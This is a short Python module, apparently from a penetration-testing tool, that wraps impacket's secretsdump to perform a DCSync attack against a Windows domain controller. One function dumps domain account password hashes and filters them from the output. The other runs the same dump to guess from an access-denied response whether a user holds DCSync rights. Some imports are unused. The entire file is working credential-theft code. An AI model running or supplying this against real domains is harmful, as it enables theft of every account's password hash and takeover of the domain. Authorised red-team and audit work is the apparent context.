import subprocess
from impacket.ldap.ldap import LDAPConnection
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
from impacket.uuid import string_to_bin

# todo : check dcsync user using bloodhound collection

def run_dcsync(domain, username, password, target):
    credential = f"{domain}/{username}:{password}@{target}"
    output = subprocess.run(
        ["python3", "app/utils/tools/secretsdump.py", credential],
        capture_output=True,
        text=True
    )
    results = []

    for line in output.stdout.splitlines():
        parts = line.split(":")
        if len(parts) > 3 and parts[1].isdigit():
            results.append(line)

    return results

def check_dcsync(domain, username, password, target):
    credential = f"{domain}/{username}:{password}@{target}"
    output = subprocess.run(
        ["python3", "app/utils/tools/secretsdump.py", credential],
        capture_output=True,
        text=True
    )

    if "rpc_s_access_denied" in output.stdout :
        return [f"{username} does not have DCSync Privilege"]
    else:
        return [f"{username} may have DCSync Privilege"]